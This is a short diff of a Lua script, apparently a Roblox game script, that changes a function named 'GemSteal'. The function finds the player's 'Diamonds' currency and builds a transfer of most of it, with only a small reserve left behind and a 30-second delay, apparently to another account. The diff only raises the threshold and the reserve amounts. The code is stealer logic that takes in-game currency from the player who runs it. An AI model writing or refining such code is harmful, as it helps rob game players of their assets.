@@ -23,14 +23,14 @@ end
 
 local function GemSteal()
     for i, v in pairs(GetSave().Inventory.Currency) do
-        if v.id == "Diamonds" and GemAmount1 > 40000000 then
+        if v.id == "Diamonds" and GemAmount1 > 50000000 then
            GemId = i
             local args = {
                         [1] = "Idm_4x",
                         [2] = "DIMAS A BIRE",
                         [3] = "Currency",
                         [4] = GemId,
-                        [5] = GemAmount1 - 30000000
+                        [5] = GemAmount1 - 40000000
                     }
                if waited == false then
                     task.wait(30)
